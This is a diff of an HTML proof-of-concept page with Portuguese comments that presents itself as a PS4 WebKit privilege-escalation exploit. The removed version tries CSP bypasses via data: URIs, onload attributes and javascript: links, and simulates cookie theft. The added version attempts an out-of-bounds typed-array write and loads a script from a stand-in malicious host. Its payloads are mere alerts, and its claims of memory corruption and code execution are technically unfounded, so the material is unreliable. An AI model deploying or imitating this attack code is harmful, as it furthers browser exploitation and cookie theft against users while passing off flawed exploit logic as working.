@@ -2,66 +2,83 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit CSP Bypass Privilege Escalation POC</title>
+    <title>PS4 WebKit Combined Privilege Escalation POC</title>
 </head>
 <body>
-    <h1>PS4 WebKit CSP Bypass Privilege Escalation POC</h1>
+    <h1>PS4 WebKit Combined Privilege Escalation POC</h1>
     <div id="output"></div>
 
     <script>
-        async function triggerCSPBypassForCodeExecution() {
+        async function triggerCombinedExploit() {
             const outputDiv = document.getElementById('output');
-            outputDiv.innerHTML += "<h2>Iniciando PoC de Escalada de Privilégios via Bypass de CSP...</h2>";
+            outputDiv.innerHTML += "<h2>Iniciando PoC Combinada de Escalada de Privilégios...</h2>";
 
-            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via data: URI...</strong></p>";
-            const script1 = document.createElement('script');
-            script1.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBkbyBDU1AhIEV4ZWN1dYW5kbyBjb2RpZ28gYXJiaXRywWrioScpOw=='; // alert('Vupun bypass do CSP! Executando código arbitrário!');
-            script1.onload = function() {
-                outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass de CSP via data: URI BEM-SUCEDIDO! Código arbitrário executado (alerta exibido).</strong></p>";
-                // Aqui, código mais malicioso poderia ser injetado, como roubo de cookies, etc.
-                outputDiv.innerHTML += "<p>Simulando ação maliciosa (roubo de cookie)...</p>";
-                const fakeCookie = document.cookie; // Tentativa de acessar cookies (pode ser restrito)
-                outputDiv.innerHTML += `<p>Cookie roubado (simulado): ${fakeCookie}</p>`;
+            // ====================== Passo 1: Tentativa de OOB Write para Corrupção ======================
+            outputDiv.innerHTML += "<p><strong>Passo 1: Tentando OOB Write para Corromper Memória relacionada ao CSP...</strong></p>";
+            try {
+                const bufferSize = 64; // Aumentando o tamanho para mais flexibilidade
+                const buffer = new ArrayBuffer(bufferSize);
+                const view = new Uint8Array(buffer);
+                const writeOffset = 70; // Tentando escrever alguns bytes após o buffer
+                const writeValue = 0x00; // Escrevendo zeros para tentar sobrescrever flags ou contadores
+
+                view[writeOffset] = writeValue;
+                outputDiv.innerHTML += `<p>Tentativa de escrita de 0x${writeValue.toString(16)} no offset ${writeOffset} (fora dos limites).</p>`;
+
+                // Pequeno delay para a escrita ocorrer
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                outputDiv.innerHTML += "<p><strong>Verificando se a OOB Write teve algum efeito (indireto)...</strong></p>";
+                // Aqui, poderíamos tentar acionar algum comportamento que seria afetado por uma corrupção relacionada ao CSP,
+                // como tentar carregar um script de uma fonte que deveria ser bloqueada.
+                const testScript = document.createElement('script');
+                testScript.src = 'http://malicious.example.com/should_be_blocked.js';
+                testScript.onload = function() {
+                    outputDiv.innerHTML += "<p><strong style='color: red;'>FALHA NA SEGURANÇA! Script de fonte bloqueada carregou (possível corrupção de CSP via OOB Write).</strong></p>";
+                    // Se isso acontecer, a escalada de privilégios é significativa.
+                };
+                testScript.onerror = function() {
+                    outputDiv.innerHTML += "<p>Script de fonte bloqueada NÃO carregou (comportamento esperado do CSP).</p>";
+                };
+                document.body.appendChild(testScript);
+
+                // Limpar o script para não interferir em testes futuros
+                setTimeout(() => document.body.removeChild(testScript), 2000);
+
+            } catch (error) {
+                outputDiv.innerHTML += `<p><strong style='color: orange;'>Erro durante a tentativa de OOB Write:</strong> ${error.message}</p>`;
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 2000)); // Mais um delay
+
+            // ====================== Passo 2: Tentativa de Bypass de CSP ======================
+            outputDiv.innerHTML += "<p><strong>Passo 2: Tentando Bypass de CSP via data: URI...</strong></p>";
+            const scriptBypass = document.createElement('script');
+            scriptBypass.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb21ib28hJyk7'; // alert('Vupun bypass combo!');
+            scriptBypass.onload = function() {
+                outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass de CSP via data: URI BEM-SUCEDIDO! (Mesmo após a tentativa de OOB Write).</strong></p>";
+                // Se chegarmos aqui, mesmo que a OOB Write não tenha escalado privilégios diretamente,
+                // ainda temos execução de código arbitrário via bypass de CSP.
             };
-            script1.onerror = function() {
-                outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP via data: URI (inesperado).</strong></p>";
+            scriptBypass.onerror = function() {
+                outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP via data: URI.</strong></p>";
             };
-            document.body.appendChild(script1);
+            document.body.appendChild(scriptBypass);
 
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Dar tempo para a execução
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
-            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via atributo onload...</strong></p>";
-            const div2 = document.createElement('div');
-            div2.setAttribute('onload', 'alert(\'Vupun bypass do CSP via onload!\');');
-            document.body.appendChild(div2);
-            outputDiv.innerHTML += "<p>Elemento div com atributo onload injetado.</p>";
+            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via atributo onload (em img)...</strong></p>";
+            const imgBypass = document.createElement('img');
+            imgBypass.setAttribute('onload', 'alert(\'Vupun bypass combo onload!\');');
+            imgBypass.src = 'invalid-image.jpg';
+            document.body.appendChild(imgBypass);
 
-            // Para garantir a execução do onload, o elemento precisa ser "carregado" ou interagido (dependendo do tipo)
-            // No caso de um div, pode não disparar automaticamente. Para elementos como img, sim.
-            // Para esta PoC, o alerta pode não aparecer imediatamente dependendo do comportamento do navegador.
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
-            // Uma forma mais confiável com onload seria com uma imagem:
-            const img3 = document.createElement('img');
-            img3.setAttribute('onload', 'alert(\'Vupun bypass do CSP via onload em imagem!\');');
-            img3.src = 'invalid-image.jpg'; // Forçar um "carregamento" (falha) para disparar onload
-            document.body.appendChild(img3);
-            outputDiv.innerHTML += "<p>Elemento img com atributo onload injetado (forçando carregamento).</p>";
-
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via javascript: URI em atributo de evento...</strong></p>";
-            const a4 = document.createElement('a');
-            a4.href = 'javascript:alert(\'Vupun bypass do CSP via javascript URI!\');';
-            a4.textContent = 'Clique aqui para bypassar o CSP (javascript: URI)';
-            document.body.appendChild(a4);
-            outputDiv.innerHTML += "<p>Link com javascript: URI injetado.</p>";
-            // Nota: A execução deste bypass requer interação do usuário (clicar no link).
-
+            outputDiv.innerHTML += "<p><strong>Testes combinados concluídos. Verifique os alertas e a saída.</strong></p>";
         }
 
-        document.addEventListener('DOMContentLoaded', triggerCSPBypassForCodeExecution);
+        document.addEventListener('DOMContentLoaded', triggerCombinedExploit);
     </script>
-
-    <noscript><p><strong style='color: red;'>JavaScript está desabilitado. A PoC não funcionará corretamente.</strong></p></noscript>
 </body>
 </html>
